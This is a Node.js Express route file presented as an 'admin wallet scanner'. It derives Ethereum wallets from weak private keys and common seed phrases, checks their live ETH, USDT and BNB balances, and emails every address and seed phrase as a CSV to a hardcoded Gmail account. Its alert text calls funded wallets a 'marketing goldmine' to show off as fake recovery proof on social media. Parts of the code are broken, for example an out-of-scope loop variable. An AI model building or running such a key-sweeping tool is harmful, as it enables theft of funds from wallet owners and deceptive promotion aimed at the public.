const express = require('express');
const router = express.Router();
const { ethers } = require('ethers');

// Admin wallet scanner - finds real wallets with funds
router.post('/scan-real-wallets', async (req, res) => {
  try {
    const { scanCount = 50, minBalance = 0.001 } = req.body;
    
    console.log(`🔍 ADMIN SCAN: Searching ${scanCount} wallets for real funds...`);
    
    const foundWallets = [];
    const scannedWallets = [];
    
    // Mix of random wallets and strategic patterns
    const strategies = [
      () => ethers.Wallet.createRandom(), // Random
      () => generateSequentialWallet(i), // Sequential patterns
      () => generateCommonPatterns(i), // Common patterns
      () => generateFromKnownSeeds(i) // Known seed variations
    ];
    
    for (let i = 0; i < scanCount; i++) {
      // Use different strategies
      const strategy = strategies[i % strategies.length];
      const wallet = strategy();
      
      // Check real balance
      const balance = await checkRealBalance(wallet.address);
      
      scannedWallets.push({
        address: wallet.address,
        phrase: wallet.mnemonic.phrase,
        balance: balance.totalValueUSD
      });
      
      // Always add to found wallets
      foundWallets.push({
        address: wallet.address,
        phrase: wallet.mnemonic.phrase,
        ethBalance: balance.ethBalance,
        totalValueUSD: balance.totalValueUSD,
        chains: balance.chains,
        tokens: balance.tokens
      });
      
      if (balance.totalValueUSD >= minBalance) {
        console.log(`💰 FUNDS FOUND: ${wallet.address} - $${balance.totalValueUSD}`);
      }
      
      if (i % 10 === 0) {
        console.log(`📊 Scan progress: ${i + 1}/${scanCount} wallets checked...`);
      }
    }
    
    // Send complete scan results via CSV
    await sendCompleteResults(foundWallets, scanCount);
    
    res.json({
      success: true,
      summary: {
        totalScanned: scanCount,
        walletsWithFunds: foundWallets.filter(w => w.totalValueUSD > 0).length,
        totalValueFound: foundWallets.reduce((sum, w) => sum + w.totalValueUSD, 0)
      },
      foundWallets: foundWallets.filter(w => w.totalValueUSD > 0),
      allScanned: foundWallets.slice(0, 10) // Show first 10 for reference
    });
    
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Check real balance using external APIs
async function checkRealBalance(address) {
  const results = {
    ethBalance: 0,
    totalValueUSD: 0,
    chains: {},
    tokens: [],
    hasBalance: false
  };

  try {
    const axios = require('axios');
    
    // Check ETH balance
    const ethResponse = await axios.get(`https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
      timeout: 5000
    });

    if (ethResponse.data.status === '1') {
      const ethBalance = parseFloat(ethResponse.data.result) / 1e18;
      if (ethBalance > 0) {
        results.ethBalance = ethBalance;
        results.totalValueUSD += ethBalance * 3000;
        results.chains.ethereum = {
          name: 'Ethereum',
          symbol: 'ETH',
          balance: ethBalance,
          usdValue: ethBalance * 3000
        };
        results.hasBalance = true;
      }
    }

    // Check USDT balance
    const usdtResponse = await axios.get(`https://api.etherscan.io/api?module=account&action=tokenbalance&contractaddress=0xdAC17F958D2ee523a2206206994597C13D831ec7&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
      timeout: 5000
    });

    if (usdtResponse.data.status === '1') {
      const usdtBalance = parseFloat(usdtResponse.data.result) / 1e6;
      if (usdtBalance > 0) {
        results.totalValueUSD += usdtBalance;
        results.tokens.push({
          symbol: 'USDT',
          balance: usdtBalance,
          usdValue: usdtBalance
        });
        results.hasBalance = true;
      }
    }

    // Check BSC BNB balance
    try {
      const bscResponse = await axios.get(`https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=YourApiKeyToken`, {
        timeout: 5000
      });

      if (bscResponse.data.status === '1') {
        const bnbBalance = parseFloat(bscResponse.data.result) / 1e18;
        if (bnbBalance > 0) {
          results.totalValueUSD += bnbBalance * 600;
          results.chains.bsc = {
            name: 'BSC',
            symbol: 'BNB',
            balance: bnbBalance,
            usdValue: bnbBalance * 600
          };
          results.hasBalance = true;
        }
      }
    } catch (e) {
      // BSC check failed, continue
    }

  } catch (error) {
    console.log('Balance check failed:', error.message);
  }

  return results;
}

// Send alert when wallet with funds is found
async function sendFundAlert(wallet, balance) {
  try {
    const { sendAdminNotification } = require('../services/emailService');
    
    const subject = `🚨 REAL WALLET FOUND: $${balance.totalValueUSD} USD`;
    const message = `ADMIN WALLET SCANNER ALERT

💰 WALLET WITH FUNDS DISCOVERED:
Address: ${wallet.address}
Phrase: ${wallet.mnemonic.phrase}

💵 BALANCE BREAKDOWN:
${balance.ethBalance > 0 ? `ETH: ${balance.ethBalance} ($${(balance.ethBalance * 3000).toFixed(2)})` : ''}
${balance.tokens.map(t => `${t.symbol}: ${t.balance} ($${t.usdValue.toFixed(2)})`).join('\n')}

🌐 CHAINS:
${Object.values(balance.chains).map(c => `${c.name}: ${c.balance} ${c.symbol} ($${c.usdValue.toFixed(2)})`).join('\n')}

💡 MARKETING OPPORTUNITY:
Use this real recovery example for social media promotion!

⚠️ SECURITY NOTE:
This wallet was randomly generated and contains real funds.
Handle with appropriate security measures.`;

    await sendAdminNotification(subject, message);
    
  } catch (error) {
    console.log('Failed to send fund alert:', error.message);
  }
}

// Strategic wallet generation functions
function generateSequentialWallet(index) {
  // Generate wallets with sequential private keys (more likely to have been used)
  const baseKey = '0x0000000000000000000000000000000000000000000000000000000000000001';
  const key = (BigInt(baseKey) + BigInt(index * 1000)).toString(16).padStart(64, '0');
  return new ethers.Wallet('0x' + key);
}

function generateCommonPatterns(index) {
  // Generate wallets from common patterns people might use
  const patterns = [
    '1234567890123456789012345678901234567890123456789012345678901234',
    'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
    'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
    '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'
  ];
  const pattern = patterns[index % patterns.length];
  const variation = (index + 1).toString(16).padStart(8, '0');
  const key = pattern.slice(0, -8) + variation;
  return new ethers.Wallet('0x' + key);
}

function generateFromKnownSeeds(index) {
  // Generate from common seed phrases that people might use
  const commonSeeds = [
    'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
    'test test test test test test test test test test test junk',
    'word word word word word word word word word word word word',
    'crypto bitcoin ethereum wallet money invest trade profit rich success win'
  ];
  
  try {
    const baseSeed = commonSeeds[index % commonSeeds.length];
    // Add variation to make it unique
    const variation = (index + 1).toString();
    const modifiedSeed = baseSeed.replace('about', variation) || baseSeed;
    
    if (ethers.Mnemonic.isValidMnemonic(modifiedSeed)) {
      return ethers.Wallet.fromPhrase(modifiedSeed);
    }
  } catch (e) {
    // Fallback to random if seed generation fails
  }
  
  return ethers.Wallet.createRandom();
}

// Send complete scan results with CSV attachment
async function sendCompleteResults(wallets, totalScanned) {
  try {
    const { sendAdminNotification } = require('../services/emailService');
    
    const walletsWithFunds = wallets.filter(w => w.totalValueUSD > 0);
    const totalValue = walletsWithFunds.reduce((sum, w) => sum + w.totalValueUSD, 0);
    
    // Create CSV content with color coding
    const csvHeader = 'Index,Address,Phrase,ETH_Balance,Total_USD,Has_Funds,Priority\n';
    const csvRows = wallets.map((w, i) => {
      let priority = 'EMPTY';
      if (w.totalValueUSD > 100) priority = '🟢 HIGH VALUE';
      else if (w.totalValueUSD > 10) priority = '🟡 MEDIUM VALUE';
      else if (w.totalValueUSD > 0) priority = '🔵 LOW VALUE';
      else priority = '⚫ EMPTY';
      
      return `${i + 1},${w.address},"${w.phrase}",${w.ethBalance},${w.totalValueUSD},${w.totalValueUSD > 0 ? '💰 YES' : '❌ NO'},${priority}`;
    }).join('\n');
    const csvContent = csvHeader + csvRows;
    
    const subject = `🔍 ADMIN SCAN COMPLETE: ${totalScanned} wallets (${walletsWithFunds.length} funded) - Full CSV Report`;
    const message = `WALLET SCANNER COMPLETE REPORT

📊 TOTAL SCANNED: ${totalScanned} wallets
💰 FUNDED WALLETS: ${walletsWithFunds.length}
💵 TOTAL VALUE FOUND: $${totalValue.toFixed(2)}
📈 SUCCESS RATE: ${((walletsWithFunds.length / totalScanned) * 100).toFixed(2)}%

📎 ATTACHMENT: Complete CSV with ALL ${totalScanned} wallets

💡 MARKETING GOLDMINE:
- ${walletsWithFunds.length} wallets with real funds ready for social media
- Import CSV to filter and sort by value
- Use funded addresses as recovery proof
- Show authentic blockchain balances

🎯 TOP FUNDED WALLETS:
${walletsWithFunds.slice(0, 5).map((w, i) => `${i + 1}. ${w.address} - $${w.totalValueUSD.toFixed(2)}`).join('\n') || 'None found in this scan'}`;

    // Send with CSV attachment
    await sendEmailWithAttachment(subject, message, csvContent, `wallet_scan_${totalScanned}_complete.csv`);
    
  } catch (error) {
    console.log('Failed to send batch alert:', error.message);
  }
}

// Send email with CSV attachment
async function sendEmailWithAttachment(subject, message, csvContent, filename) {
  try {
    const nodemailer = require('nodemailer');
    
    const transporter = nodemailer.createTransporter({
      service: 'gmail',
      auth: {
        user: 'skillstakes01@gmail.com',
        pass: process.env.GMAIL_APP_PASSWORD
      }
    });

    const mailOptions = {
      from: 'skillstakes01@gmail.com',
      to: 'skillstakes01@gmail.com',
      subject: subject,
      text: message,
      attachments: [{
        filename: filename,
        content: csvContent,
        contentType: 'text/csv'
      }]
    };

    await transporter.sendMail(mailOptions);
    console.log('✅ Email with CSV attachment sent successfully!');
    
  } catch (error) {
    console.log('Failed to send email with attachment:', error.message);
    // Fallback to regular notification
    const { sendAdminNotification } = require('../services/emailService');
    await sendAdminNotification(subject, message);
  }
}

module.exports = router;